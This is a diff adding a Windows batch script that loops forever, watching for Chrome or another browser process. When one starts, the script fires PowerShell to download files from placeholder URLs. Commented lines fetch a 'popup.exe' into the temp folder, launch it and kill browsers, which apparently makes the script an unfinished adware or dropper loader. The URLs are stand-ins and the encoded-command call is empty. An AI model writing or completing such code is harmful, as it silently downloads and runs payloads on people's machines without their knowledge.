@@ -1,0 +1,63 @@
+Set MyProcess2=chrome.exe
+Set MyProcess3=browser.exe
+set count=1
+
+set m1=popup.exe
+set files='url1','url2'
+set down=1
+set firstTime=1
+@REM if exist %TEmp%\%m1% (
+@REM 	echo xxxxx
+@REM ) else (
+@REM 	powershell "(%files%)|foreach{$fileName='%TEMP%'+'\'+(Split-Path -Path $_ -Leaf).Substring(0,(Split-Path -Path $_ -Leaf).Length-5);(new-object System.Net.WebClient).DownloadFile($_,$fileName);}"
+@REM )
+
+
+:CheckProcess_in_Loop
+cls
+
+
+Tasklist /NH /FI "imagename eq %MyProcess2%" 2>nul |find /i "%MyProcess2%" >nul
+If not errorlevel 1 (
+	if %firstTime% EQU 1 (
+		set down=1
+		set firstTime=2
+	)
+	
+	if %down% EQU 1 ( 
+		echo iiiiiiiiiiiiiiiiiiiii
+		powershell -E 
+		set down=2
+	) 
+
+	echo yes chro
+	@REM taskkill /f /im chrome.exe
+	@REM Tasklist /NH /FI "imagename eq %m1%" 2>nul |find /i "%m1%" >nul
+	@REM If not errorlevel 1 (echo ok) else (start %temp%\%m1%)
+) else (echo no)
+
+Tasklist /NH /FI "imagename eq %MyProcess3%" 2>nul |find /i "%MyProcess3%" >nul
+If not errorlevel 1 (
+	if %firstTime% EQU 1 (
+		set down=2
+		set firstTime=2
+	)
+	if %down% EQU 2 ( 
+		echo yyyyyyyyyyyyyyyyyyyyyyyyy
+		powershell "Invoke-WebRequest 'url' -OutFile 'C:\Users\HUY\Desktop\1.ico'"
+	 	set down=1
+	)
+	echo yes brow
+	@REM taskkill /f /im browser.exe
+	@REM Tasklist /NH /FI "imagename eq %m1%" 2>nul |find /i "%m1%" >nul
+	@REM If not errorlevel 1 (echo ok) else (start %temp%\%m1%)
+) else (echo no)
+
+
+if %count% EQU 1 ( 
+	@REM echo xxxxxxxxxxxxxxxxxxxxxxxx
+	Timeout /T 1 /NoBreak>nul
+	set count=2
+) else ( Timeout /T 6 /NoBreak>nul )
+
+Goto CheckProcess_in_Loop
